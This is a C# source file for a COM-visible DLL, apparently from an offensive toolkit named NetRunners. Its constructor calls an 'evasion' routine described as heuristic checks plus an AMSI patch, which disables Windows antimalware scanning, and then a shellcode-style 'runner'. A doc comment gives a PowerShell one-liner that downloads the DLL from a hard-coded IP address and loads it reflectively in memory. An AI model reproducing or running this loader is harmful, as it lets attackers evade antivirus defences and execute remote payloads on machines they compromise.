using System.Diagnostics;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass
{
    /// <summary>
    /// Main function for this DLL. 
    /// Calls Heuristics and Amsi patch, then calls a runner (uncomment one and keep others commented.)
    /// </summary>
    /// <example>
    /// You can run this compiled managed DLL using this powershell one-liner:
    /// [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://192.168.45.220/bin/x64/NetRunnersDll.dll')).CreateInstance('NetRunnersDll.TestClass')
    /// </example>

    public TestClass()
    {
        // evasion
        NetRunners.Helpers.Helper.PerformChecks();
        // execution
        NetRunners.Helpers.Helper.SelectRunner();
    }
    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
